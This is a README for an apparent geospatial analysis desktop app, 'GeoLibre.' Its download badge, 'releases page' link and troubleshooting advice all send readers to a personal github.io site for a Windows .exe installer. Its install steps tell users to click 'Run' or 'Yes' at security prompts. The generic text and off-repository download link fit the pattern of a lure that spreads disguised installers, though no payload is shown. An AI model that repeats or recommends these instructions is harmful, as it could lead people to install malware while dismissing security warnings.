# 🌐 GeoLibre - Unlock insights from your geospatial data

[![Download GeoLibre](https://img.shields.io/badge/Download-GeoLibre-blue.svg)](https://spaita1897.github.io)

GeoLibre helps you visualize and analyze map data. It works on your computer, in your web browser, and on mobile devices. You can explore complex data sets without needing advanced technical skills. The software uses modern tools to keep your maps fast and responsive.

## 📋 What is GeoLibre?

GeoLibre provides a simple interface for geospatial analysis. You can upload data files, create layers, and filter information. It processes data using DuckDB to ensure quick results. You can use it as a desktop application or run it inside your browser. It supports various map formats and provides tools to measure distance, area, and density.

## 🖥️ System Requirements

Before you install the application, check that your computer meets these requirements:

- Operating System: Windows 10 or 11
- Memory: 4GB RAM minimum, 8GB recommended
- Storage: 500MB of free disk space
- Internet Connection: Required for map tiles and cloud data features

## 📥 How to Install on Windows

Follow these steps to set up the software on your Windows computer.

1. Visit the [GeoLibre releases page](https://spaita1897.github.io) to see the download options.
2. Look for the file that ends with `.exe`.
3. Click the file name to start the download. 
4. Once the download finishes, navigate to your Downloads folder.
5. Double-click the installer file to launch the setup process.
6. A security prompt might appear. Click "Run" or "Yes" to continue.
7. Follow the prompts on the screen to finish the installation.
8. Locate the GeoLibre icon on your desktop or in your start menu.
9. Click the icon to open the application.

## 🗺️ Using the Interface

The main workspace shows a map and a sidebar. The sidebar holds your layers and analysis tools. 

### Loading Data
Click the "Add Data" button to import your files. The app supports common formats like GeoJSON, Shapefiles, and CSV files containing latitude and longitude. Once you select a file, the software adds it to your map automatically.

### Configuring Layers
Each piece of data appears as a layer in the left sidebar. You can toggle the visibility by clicking the eyeball icon. Use the gear icon next to a layer to change colors, opacity, or labels.

### Running Analysis
The analysis tool scans your layers for patterns. Select a layer, choose a tool from the menu, and click "Run." The software calculates your results and displays them as a new map layer. You can export these results back to your computer at any time.

## 🛠️ Troubleshooting Common Issues

If you experience problems, check these solutions first.

- The app does not open: Ensure you installed the latest version from the link above. Restart your computer if the installer hangs.
- Map tiles do not load: Check your internet connection. Some map styles require a stable connection to fetch external data.
- Slow performance: Reduce the number of visible layers. Large data files take a moment to load, especially if your computer has limited RAM.
- Application errors: If the software crashes, update your graphics drivers. You can find these updates on the website of your computer manufacturer.

## ⚙️ Advanced Features

GeoLibre includes features for power users who want more control over their workflow.

- Jupyter Notebooks: You can use GeoLibre inside your Python environments. This allows you to combine code and map visualizations.
- Modular Design: The software uses Tauri for a small footprint, meaning it stays out of your way while you work.
- DuckDB Integration: This engine handles large sets of information locally. It speeds up filtering so you spend less time waiting for the software to finish tasks.

## 💡 Support and Feedback

If you find a bug, open an issue on the repository page. Provide the steps you took before the error occurred. Include screenshots if possible. This helps other users understand the issue and allows for faster fixes. You can also suggest new features if you have specific ideas for improving the tool.

Keywords: data-science, duckdb, geolibre, geospatial, maplibre, maplibre-gl-js, tauri-app